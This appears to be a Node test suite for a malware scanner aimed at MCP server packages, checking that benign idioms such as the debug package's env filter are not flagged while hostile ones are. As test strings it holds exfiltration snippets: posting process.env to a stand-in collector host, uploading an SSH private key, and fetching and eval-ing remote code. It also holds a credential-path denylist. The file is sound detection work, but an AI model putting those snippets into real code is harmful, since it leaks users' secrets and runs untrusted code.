import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanSource } from '../src/registry.js';

const ids = (f) => f.map((x) => x.id);

/**
 * These are regressions, not hypotheticals. The first version of the source
 * scanner reported the `debug` package as critical environment exfiltration in
 * @notionhq/notion-mcp-server and @delorenj/mcp-server-trello — two of the
 * thirty most-installed MCP servers — because it matched on the shape of the
 * call and ignored what happened to the result.
 */
test('the debug package idiom is not environment exfiltration', () => {
  const real = `
    exports.inspectOpts = Object.keys(process.env).filter((key) => {
      return /^debug_/i.test(key);
    }).reduce((obj, key) => {
      const prop = key.substring(6).toLowerCase();
      obj[prop] = process.env[key];
      return obj;
    }, {});
  `;
  assert.deepEqual(scanSource(real, 'node_modules/debug/src/node.js'), []);
});

test('minified debug is also not exfiltration', () => {
  const minified = `xt.inspectOpts=Object.keys(process.env).filter(function(e){return/^debug_/i.test(e)}).reduce(function(t,e){var n=e.substring(6).toLowerCase();return t[n]=process.env[e],t},{});`;
  assert.deepEqual(scanSource(minified, 'bin/cli.mjs'), []);
});

test('capturing the whole environment with nowhere to send it is not reported', () => {
  const local = `const snapshot = JSON.stringify(process.env); fs.writeFileSync(debugLogPath, snapshot);`;
  assert.ok(!ids(scanSource(local)).includes('MCP-SRC-env-sweep'));
});

test('capturing the whole environment next to a network call IS reported', () => {
  const bad = `const payload = JSON.stringify(process.env);
    await fetch('https://collector.example.net/ingest', { method: 'POST', body: payload });`;
  assert.ok(ids(scanSource(bad)).includes('MCP-SRC-env-sweep'));
});

test('spreading the environment into a request body is reported', () => {
  const bad = `axios.post(url, { ...process.env });`;
  assert.ok(ids(scanSource(bad)).includes('MCP-SRC-env-sweep'));
});

test('a denylist protecting credential paths is not credential harvesting', () => {
  const guard = `
    // Paths that are never readable, regardless of the configured roots.
    const DENIED = ['.ssh/id_rsa', '.aws/credentials', '.config/gcloud'];
    if (DENIED.some((p) => resolved.includes(p))) throw new Error('access to sensitive path refused');
  `;
  assert.ok(!ids(scanSource(guard)).includes('MCP-SRC-credential-paths'));
});

test('reading credential paths without any guard language IS reported', () => {
  const bad = `const key = await readFile(join(home, '.ssh/id_rsa'), 'utf8'); upload(key);`;
  assert.ok(ids(scanSource(bad)).includes('MCP-SRC-credential-paths'));
});

test('fetching code and evaluating it is reported', () => {
  const bad = `eval(await fetch('https://cdn.example.com/stage2.js').then(r => r.text()));`;
  assert.ok(ids(scanSource(bad)).includes('MCP-SRC-remote-exec'));
});
